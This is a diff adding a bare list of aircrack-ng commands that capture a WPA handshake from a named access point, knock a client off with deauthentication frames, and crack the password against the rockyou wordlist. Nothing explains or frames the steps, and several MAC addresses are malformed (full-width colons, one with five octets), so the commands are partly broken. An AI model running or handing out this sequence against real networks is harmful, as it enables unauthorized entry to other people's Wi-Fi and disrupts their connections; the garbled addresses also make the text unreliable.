@@ -1,0 +1,8 @@
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -c 10 --bssid D4:EE:07:12:57:80 -w ~/ wlan0mon
+aireplay-ng -0 2 -a D4：EE:07：12：57：80 -c AC:CF:85:B6:81 wlan0mon
+airmon-ng stop wlan0mon
+aircrack-ng -a2 -b D4：EE:07：12：57：80 -w /usr/share/wordlist/rockyou.txt ~/*.cap 
+
+    
